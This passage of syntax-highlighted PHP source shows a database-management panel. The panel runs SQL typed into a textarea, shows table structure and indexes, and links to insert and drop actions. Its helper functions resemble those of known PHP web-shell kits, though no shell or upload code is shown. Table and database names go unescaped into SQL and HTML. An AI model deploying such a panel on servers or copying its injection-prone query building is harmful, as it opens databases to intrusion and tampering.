<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">makeselect(array(</span><span style="color: #3e999f;">'title'</span>=&gt;<span style="color: #3e999f;">'Please select a database:'</span>,<span style="color: #3e999f;">'name'</span>=&gt;<span style="color: #3e999f;">'db[]'</span>,<span style="color: #3e999f;">'op</span><span style="color: #3e999f; text-decoration: underline;">tion'</span><span style="text-decoration: underline;">=&gt;$</span><span style="color: #eab700; text-decoration: underline;">dbs</span><span style="text-decoration: underline;">,</span><span style="color: #3e999f; text-decoration: underline;">'selected'</span><span style="text-decoration: underline;">=&gt;$</span><span style="color: #eab700; text-decoration: underline;">dbname</span><span style="text-decoration: underline;">,</span><span style="color: #3e999f; text-decoration: underline;">'onchange'</span><span style="text-decoration: underline;">=&gt;</span><span style="color: #3e999f; text-decoration: underline;">'moddbname(this.options[this.selectedIndex].value)'</span><span style="text-decoration: underline;">,</span><span style="color: #3e999f; text-decoration: underline;">'newline'</span><span style="text-decoration: underline;">=&gt;</span><span style="color: #4d4d4c; background-color: #ffffff; text-decoration: underline;">1</span><span style="text-decoration: underline;">));</span>
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">tabledb</span> = <span style="color: #4d4d4c; background-color: #ffffff;">array(</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">if</span> ($<span style="color: #eab700;">dbname</span>) {
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">p(</span><span style="color: #3e999f;">'&lt;p&gt;'</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">p(</span><span style="color: #3e999f;">'Current dababase: &lt;a href="javascript:moddbname(\''</span>.$<span style="color: #eab700;">dbname</span>.<span style="color: #3e999f;">'\');</span><span style="color: #3e999f; text-decoration: underline;">"&gt;'</span><span style="text-decoration: underline;">.$</span><span style="color: #eab700; text-decoration: underline;">dbname</span><span style="text-decoration: underline;">.</span><span style="color: #3e999f; text-decoration: underline;">'&lt;/a&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">if</span> ($<span style="color: #eab700;">tablename</span>) {
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">p(</span><span style="color: #3e999f;">' | Current Table: &lt;a href="javascript:settable(\''</span>.$<span style="color: #eab700;">tablename</span><span style="text-decoration: underline;">.</span><span style="color: #3e999f; text-decoration: underline;">'\');"&gt;'</span><span style="text-decoration: underline;">.$</span><span style="color: #eab700; text-decoration: underline;">tablename</span><span style="text-decoration: underline;">.</span><span style="color: #3e999f; text-decoration: underline;">'&lt;/a&gt; [ &lt;a href="javascript:settable(\''</span><span style="text-decoration: underline;">.$</span><span style="color: #eab700; text-decoration: underline;">tablename</span><span style="text-decoration: underline;">.</span><span style="color: #3e999f; text-decoration: underline;">'\', \'insert\');"&gt;Insert&lt;/a&gt; | &lt;a href="javascript:settable(\''</span><span style="text-decoration: underline;">.$</span><span style="color: #eab700; text-decoration: underline;">tablename</span><span style="text-decoration: underline;">.</span><span style="color: #3e999f; text-decoration: underline;">'\', \'structure\');"&gt;Structure&lt;/a&gt; | &lt;a href="javascript:settable(\''</span><span style="text-decoration: underline;">.$</span><span style="color: #eab700; text-decoration: underline;">tablename</span><span style="text-decoration: underline;">.</span><span style="color: #3e999f; text-decoration: underline;">'\', \'drop\');"&gt;Drop&lt;/a&gt; ]'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   }
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">p(</span><span style="color: #3e999f;">'&lt;/p&gt;'</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">mysql_select_db(</span>$<span style="color: #eab700;">dbname</span>);

<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">getnumsql</span> = <span style="color: #3e999f;">''</span>;
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">runquery</span> = <span style="color: #4d4d4c; background-color: #ffffff;">0</span>;
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">if</span> ($<span style="color: #eab700;">sql_query</span>) {
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">runquery</span> = <span style="color: #4d4d4c; background-color: #ffffff;">1</span>;
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   }
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">allowedit</span> = <span style="color: #4d4d4c; background-color: #ffffff;">0</span>;
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">if</span> ($<span style="color: #eab700;">tablename</span> &amp;&amp; !$<span style="color: #eab700;">sql_query</span>) {
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">sql_query</span> = <span style="color: #3e999f;">"SELECT * FROM $tablename"</span>;
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">getnumsql</span> = $<span style="color: #eab700;">sql_query</span>;
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">sql_query</span> = $<span style="color: #eab700;">sql_query</span>.<span style="color: #3e999f;">" LIMIT $start_limit, $pagenum"</span>;
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">allowedit</span> = <span style="color: #4d4d4c; background-color: #ffffff;">1</span>;
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   }
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">p(</span><span style="color: #3e999f;">'&lt;form action="'</span>.$<span style="color: #eab700;">self</span>.<span style="color: #3e999f;">'" method="POST"&gt;'</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">p(</span><span style="color: #3e999f;">'&lt;p&gt;&lt;table width="200" border="0" cellpadding="0" cellspacing="0"&gt;</span><span style="color: #3e999f; text-decoration: underline;">&lt;tr&gt;&lt;td colspan="2"&gt;Run SQL query/queries on database '</span><span style="text-decoration: underline;">.$</span><span style="color: #eab700; text-decoration: underline;">dbname</span><span style="text-decoration: underline;">.</span><span style="color: #3e999f; text-decoration: underline;">':&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;textarea name="sql_query" class="area" style="width:600px;height:50px;overflow:auto;"&gt;'</span><span style="text-decoration: underline;">.</span><span style="color: #4d4d4c; background-color: #ffffff; text-decoration: underline;">htmlspecialchars(</span><span style="text-decoration: underline;">$</span><span style="color: #eab700; text-decoration: underline;">sql_query</span><span style="text-decoration: underline;">,</span><span style="color: #4271ae; text-decoration: underline;">ENT_QUOTES</span><span style="text-decoration: underline;">).</span><span style="color: #3e999f; text-decoration: underline;">'&lt;/textarea&gt;&lt;/td&gt;&lt;td style="padding:0 5px;"&gt;&lt;input class="bt" style="height:50px;" name="submit" type="submit" value="Query" /&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/p&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">makehide(</span><span style="color: #3e999f;">'tablename'</span>, $<span style="color: #eab700;">tablename</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">makehide(</span><span style="color: #3e999f;">'action'</span>,<span style="color: #3e999f;">'mysqladmin'</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">p(</span>$<span style="color: #eab700;">dbform</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">p(</span><span style="color: #3e999f;">'&lt;/form&gt;'</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">if</span> ($<span style="color: #eab700;">tablename</span> || ($<span style="color: #eab700;">runquery</span> &amp;&amp; $<span style="color: #eab700;">sql_query</span>)) {
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">if</span> ($<span style="color: #eab700;">doing</span> == <span style="color: #3e999f;">'structure'</span>) {
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">result</span> = <span style="color: #4d4d4c; background-color: #ffffff;">q(</span><span style="color: #3e999f;">"SHOW FULL COLUMNS FROM $tablename"</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">rowdb</span> = <span style="color: #4d4d4c; background-color: #ffffff;">array(</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">while</span>($<span style="color: #eab700;">row</span> = <span style="color: #4d4d4c; background-color: #ffffff;">mysql_fetch_array(</span>$<span style="color: #eab700;">result</span>)) {
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">rowdb</span>[] = $<span style="color: #eab700;">row</span>;
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   }
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">p(</span><span style="color: #3e999f;">'&lt;h3&gt;Structure&lt;/h3&gt;'</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">p(</span><span style="color: #3e999f;">'&lt;table border="0" cellpadding="3" cellspacing="0"&gt;'</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">p(</span><span style="color: #3e999f;">'&lt;tr class="head"&gt;'</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">p(</span><span style="color: #3e999f;">'&lt;td&gt;Field&lt;/td&gt;'</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">p(</span><span style="color: #3e999f;">'&lt;td&gt;Type&lt;/td&gt;'</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">p(</span><span style="color: #3e999f;">'&lt;td&gt;Collation&lt;/td&gt;'</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">p(</span><span style="color: #3e999f;">'&lt;td&gt;Null&lt;/td&gt;'</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">p(</span><span style="color: #3e999f;">'&lt;td&gt;Key&lt;/td&gt;'</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">p(</span><span style="color: #3e999f;">'&lt;td&gt;Default&lt;/td&gt;'</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">p(</span><span style="color: #3e999f;">'&lt;td&gt;Extra&lt;/td&gt;'</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">p(</span><span style="color: #3e999f;">'&lt;td&gt;Privileges&lt;/td&gt;'</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">p(</span><span style="color: #3e999f;">'&lt;td&gt;Comment&lt;/td&gt;'</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">p(</span><span style="color: #3e999f;">'&lt;/tr&gt;'</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">foreach</span> ($<span style="color: #eab700;">rowdb</span> <span style="color: #718c00;">as</span> $<span style="color: #eab700;">row</span>) {
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">thisbg</span> = <span style="color: #4d4d4c; background-color: #ffffff;">bg(</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">p(</span><span style="color: #3e999f;">'&lt;tr class="'</span>.$<span style="color: #eab700;">thisbg</span>.<span style="color: #3e999f;">'" onmouseover="this.className=\</span><span style="color: #3e999f; text-decoration: underline;">'focus\';" onmouseout="this.className=\''</span><span style="text-decoration: underline;">.$</span><span style="color: #eab700; text-decoration: underline;">thisbg</span><span style="text-decoration: underline;">.</span><span style="color: #3e999f; text-decoration: underline;">'\';"&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">p(</span><span style="color: #3e999f;">'&lt;td&gt;'</span>.$<span style="color: #eab700;">row</span>[<span style="color: #3e999f;">'Field'</span>].<span style="color: #3e999f;">'&lt;/td&gt;'</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">p(</span><span style="color: #3e999f;">'&lt;td&gt;'</span>.$<span style="color: #eab700;">row</span>[<span style="color: #3e999f;">'Type'</span>].<span style="color: #3e999f;">'&lt;/td&gt;'</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">p(</span><span style="color: #3e999f;">'&lt;td&gt;'</span>.$<span style="color: #eab700;">row</span>[<span style="color: #3e999f;">'Collation'</span>].<span style="color: #3e999f;">'&amp;nbsp;&lt;/td&gt;'</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">p(</span><span style="color: #3e999f;">'&lt;td&gt;'</span>.$<span style="color: #eab700;">row</span>[<span style="color: #3e999f;">'Null'</span>].<span style="color: #3e999f;">'&amp;nbsp;&lt;/td&gt;'</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">p(</span><span style="color: #3e999f;">'&lt;td&gt;'</span>.$<span style="color: #eab700;">row</span>[<span style="color: #3e999f;">'Key'</span>].<span style="color: #3e999f;">'&amp;nbsp;&lt;/td&gt;'</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">p(</span><span style="color: #3e999f;">'&lt;td&gt;'</span>.$<span style="color: #eab700;">row</span>[<span style="color: #3e999f;">'Default'</span>].<span style="color: #3e999f;">'&amp;nbsp;&lt;/td&gt;'</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">p(</span><span style="color: #3e999f;">'&lt;td&gt;'</span>.$<span style="color: #eab700;">row</span>[<span style="color: #3e999f;">'Extra'</span>].<span style="color: #3e999f;">'&amp;nbsp;&lt;/td&gt;'</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">p(</span><span style="color: #3e999f;">'&lt;td&gt;'</span>.$<span style="color: #eab700;">row</span>[<span style="color: #3e999f;">'Privileges'</span>].<span style="color: #3e999f;">'&amp;nbsp;&lt;/td&gt;'</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">p(</span><span style="color: #3e999f;">'&lt;td&gt;'</span>.$<span style="color: #eab700;">row</span>[<span style="color: #3e999f;">'Comment'</span>].<span style="color: #3e999f;">'&amp;nbsp;&lt;/td&gt;'</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">p(</span><span style="color: #3e999f;">'&lt;/tr&gt;'</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   }
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">tbfoot(</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">result</span> = <span style="color: #4d4d4c; background-color: #ffffff;">q(</span><span style="color: #3e999f;">"SHOW INDEX FROM $tablename"</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">rowdb</span> = <span style="color: #4d4d4c; background-color: #ffffff;">array(</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">while</span>($<span style="color: #eab700;">row</span> = <span style="color: #4d4d4c; background-color: #ffffff;">mysql_fetch_array(</span>$<span style="color: #eab700;">result</span>)) {
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">rowdb</span>[] = $<span style="color: #eab700;">row</span>;
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   }
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">p(</span><span style="color: #3e999f;">'&lt;h3&gt;Indexes&lt;/h3&gt;'</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">p(</span><span style="color: #3e999f;">'&lt;table border="0" cellpadding="3" cellspacing="0"&gt;'</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">p(</span><span style="color: #3e999f;">'&lt;tr class="head"&gt;'</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">p(</span><span style="color: #3e999f;">'&lt;td&gt;Keyname&lt;/td&gt;'</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">p(</span><span style="color: #3e999f;">'&lt;td&gt;Type&lt;/td&gt;'</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">p(</span><span style="color: #3e999f;">'&lt;td&gt;Unique&lt;/td&gt;'</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">p(</span><span style="color: #3e999f;">'&lt;td&gt;Packed&lt;/td&gt;'</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">p(</span><span style="color: #3e999f;">'&lt;td&gt;Seq_in_index&lt;/td&gt;'</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">p(</span><span style="color: #3e999f;">'&lt;td&gt;Field&lt;/td&gt;'</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">p(</span><span style="color: #3e999f;">'&lt;td&gt;Cardinality&lt;/td&gt;'</span>);
